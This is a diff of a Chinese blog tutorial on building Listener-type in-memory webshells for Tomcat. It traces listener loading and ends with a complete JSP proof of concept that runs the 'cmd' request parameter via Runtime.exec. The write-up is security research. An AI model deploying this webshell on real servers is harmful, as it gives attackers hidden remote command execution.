@@ -291,7 +291,7 @@
                 
 
                 <blockquote>
-<p>本文首发于 FreeBuf <a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/343735.html" >https://www.freebuf.com/articles/web/343735.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>本文首发于 FreeBuf <a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/343735.html">https://www.freebuf.com/articles/web/343735.html<i class="fas fa-external-link-alt"></i></a></p>
 </blockquote>
 <span id="more"></span>
 <h1 id="Java-内存马系列-04-Tomcat-之-Listener-型内存马"><a href="#Java-内存马系列-04-Tomcat-之-Listener-型内存马" class="headerlink" title="Java 内存马系列-04-Tomcat 之 Listener 型内存马"></a>Java 内存马系列-04-Tomcat 之 Listener 型内存马</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>内存马给我最大的感受是，它可以有很强的隐蔽性，但是攻击方式也是比较局限，仅仅是文件上传这种，相比于反序列化其实，反序列化的危害性要强的多的多。</p>
@@ -309,11 +309,11 @@
 </ul>
 <p>要求 Listener 的业务对象要实现 <code>EventListener</code> 这个接口</p>
 <p>我们可以先去看一下 <code>EventListener</code> 这个接口</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/EventListener.png" class>
 
 <p>它有非常多的实现类，那么如果我们需要实现内存马的话就需要找一个每个请求都会触发的 Listener，我们去寻找的时候一定是优先找 <strong>Servlet</strong> 开头的类。</p>
 <p>这里我找到了 <code>ServletRequestListener</code> ，因为根据名字以及其中的 <code>requestInitialized()</code> 方法感觉我们的发送的每个请求都会触发这个监控器。</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ServletRequestListener.png" class>
 
 <p>这里我们尝试自己写一个 Listener，并进行测试。</p>
 <p>因为前面猜想 <code>requestInitialized()</code> 方法可以触发 Listener 监控器，所以我们在 <code>requestInitialized()</code> 方法里面加上一些代码，来证明它何时被执行。</p>
@@ -326,7 +326,7 @@
 
 <p>接着访问对应的路径即可，这里是因人而异的。</p>
 <p>当我们访问对应路径的时候，会在控制台打印出如下的信息</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/UsedListener.png" class>
 
 <p>至此，Listener 基础代码实现完成，下面我们来分析 Listener 的运行流程。</p>
 <h2 id="0x04-Listener-流程分析"><a href="#0x04-Listener-流程分析" class="headerlink" title="0x04 Listener 流程分析"></a>0x04 Listener 流程分析</h2><ul>
@@ -337,46 +337,46 @@
 <ul>
 <li>找了很久，主要是去看谁调用了 web.xml，最好是谁把 web.xml 作为参数传进去，因为一般作为参数传进去，才会进行大处理，发现是 <code>configureContext()</code> 方法</li>
 </ul>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/configureContext.png" class>
 
 <p>这个方法主要是做一些读取数据并保存的工作，我们不难发现其中读取了 Filter 等 Servlet 组件，我们重点肯定是关注于 Listener 的读取的，最后找到在这个地方读取了 web.xml</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getListeners.png" class>
 
 <p>所以这个地方，1235 行可以先打个断点，接着我们继续往里看 ———— <code>addApplicationListener()</code> 这个方法，进去之后发现是一个接口中的方法，我们去找它的实现方法</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addApplicationListeners.png" class>
 
 <p>第一个 <code>FailedContext</code> 类里面的 <code>addApplicationListener()</code> 是没东西的，东西在 <code>StandContext</code> 里面。</p>
 <blockquote>
 <p>明白断点后开始调试：</p>
 </blockquote>
 <p>一开始我们的第一步，直接获取到 web.xml，如图</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/configureContextWebXML.png" class>
 
 <p>我们看到 webxml 里面的 listener 已经有了对应的 Listener 文件，继续往下走。</p>
 <p>总的代码比较啰嗦，但是耐心一点也还好，我们下一步应该是走到 <code>addApplicationListener()</code> 这里的</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addApplicationListenersCode.png" class>
 
 <h4 id="读取完配置文件，加载-Listener"><a href="#读取完配置文件，加载-Listener" class="headerlink" title="读取完配置文件，加载 Listener"></a>读取完配置文件，加载 Listener</h4><p>当我们读取完配置文件，当应用启动的时候，<code>StandardContext</code> 会去调用 <code>listenerStart()</code> 方法。这个方法做了一些基础的安全检查，最后完成简单的 start 业务。</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/listenerStart.png" class>
 
 <p>刚开始的地方，<code>listenerStart()</code> 方法中有这么一个语句：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String listeners[] = findApplicationListeners();</span><br></pre></td></tr></table></figure>
 
 <p>这里实际就是把之前的 Listener 存到这里面，之前看某位师傅的文章这个地方分析半天，其实根本没必要，这里自己心里有个数就好了，我也就不跟断点了，这个调试过程非常烦杂，没有必要</p>
 <h3 id="2-应用运行过程"><a href="#2-应用运行过程" class="headerlink" title="2. 应用运行过程"></a>2. 应用运行过程</h3><p>我们最先开始调试，肯定是把断点下在 <code>requestInitialized()</code> 方法这里的，调试之后发现一个什么问题呢？是我们走进去之后的代码没有什么实际作用，其实这里是断点下错了，正确的断点位置应该下在这里。</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Important.png" class>
 
 <p>正确的断点位置如图</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TrueDebug.png" class>
 
 <p>开始调试，这里我们先进到 <code>getApplicationEventListeners()</code> 方法里面</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getApplicationEventListeners.png" class>
 
 <p><code>getApplicationEventListeners()</code> 方法做了这么一件事：获取一个 Listener 数组</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">        <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们可以点进去看一下 applicationEventListenersList 是什么，可以看到 Listener 实际上是存储在 <code>applicationEventListenersList</code> 属性中的。</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/applicationEventListeners.png" class>
 
 <p>并且我们可以通过 <code>StandardContext#addApplicationEventListener()</code> 方法来添加 Listener</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">        applicationEventListenersList.add(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -386,7 +386,7 @@
 <p>到这一步的调试就没有内容了，所以这里的逻辑有应该是和 Filter 差不多的，Listener 这里有一个 Listener 数组，对应的 Filter 里面也有一个 Filter 数组。</p>
 </blockquote>
 <p>在 Listener 组内的 Listeners 会被逐个触发，最后到我们自己定义的 Listener 的 <code>requestInitialized()</code> 方法去。</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/UseRequestInitialized.png" class>
 
 <h3 id="3-小结运行流程"><a href="#3-小结运行流程" class="headerlink" title="3. 小结运行流程"></a>3. 小结运行流程</h3><ul>
 <li>在应用开始前，先读取了 web.xml，从中读取到 Listeners，并进行加载；加载完毕之后会进行逐个读取，对每一个 Listener，都会到 <code>requestInitialized()</code> 方法进去。</li>
@@ -398,7 +398,7 @@
 </ul>
 <p>Listener 与 Filter 的大体流程是一样的，所以我们也可以把 Listener 先放到整个 Servlet 最前面去</p>
 <p>这就是最基础的两步了，如果排先后顺序的话一定是先获取 StandardContext 类，再通过 <code>addApplicationEventListener()</code> 方法把恶意的 Listener 放进去，我们可以用流程图来表示一下运行过程。</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ListenerRoute.png" class>
 
 <h3 id="2-EXP-编写"><a href="#2-EXP-编写" class="headerlink" title="2. EXP 编写"></a>2. EXP 编写</h3><p>我们一步步来实现整个 EXP</p>
 <ul>
@@ -408,7 +408,7 @@
 
 <p>接着是获取 StandardContext 的代码，并且添加 Listener</p>
 <p>在 <code>StandardHostValve#invoke</code> 中，可以看到其通过request对象来获取 <code>StandardContext</code> 类</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Invoke.png" class>
 
 <p>同样地，由于JSP内置了request对象，我们也可以使用同样的方式来获取</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
@@ -423,7 +423,7 @@
 <h3 id="3-最终-PoC"><a href="#3-最终-PoC" class="headerlink" title="3. 最终 PoC"></a>3. 最终 PoC</h3><h4 id="JSP-版"><a href="#JSP-版" class="headerlink" title="JSP 版"></a>JSP 版</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Arrays&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;  </span><br><span class="line">&lt;%!  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListenerMemShell</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            String cmd;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                cmd = sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">                org.apache.catalina.connector.<span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>).getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);  </span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>)&#123;  </span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();  </span><br><span class="line">                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];  </span><br><span class="line">                    <span class="keyword">while</span> ((i=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;  </span><br><span class="line">                        response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));  </span><br><span class="line">                        response.getWriter().write(<span class="string">&quot;\r\n&quot;</span>);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">%&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getServletContext();  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);  </span><br><span class="line">  </span><br><span class="line">    Object[] objects = standardContext.getApplicationEventListeners();  </span><br><span class="line">    List&lt;Object&gt; listeners = Arrays.asList(objects);  </span><br><span class="line">    List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(listeners);  </span><br><span class="line">    arrayList.add(<span class="keyword">new</span> <span class="title class_">ListenerMemShell</span>());  </span><br><span class="line">    standardContext.setApplicationEventListeners(arrayList.toArray());  </span><br><span class="line">  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
 <p>成功</p>
-
+<img src="/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ListenerSuccess.png" class>
 
 <ul>
 <li>这是 JSP 的写法，我们还可以和 Filter 型内存马一样，用 .java 的写法来完成。</li>
@@ -433,7 +433,7 @@
 
 
 <h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><p>相对于 Filter 型内存马来说，Listener 型内存马的实现更为简易的多，从难度上来说，可以把 Listener 型内存马需要实现的步骤看成是 Filter 型内存马的一部分。</p>
-<h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://goodapple.top/archives/1355" >https://goodapple.top/archives/1355<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1651" >http://wjlshare.com/archives/1651<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="http://wjlshare.com/archives/1651">http://wjlshare.com/archives/1651<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
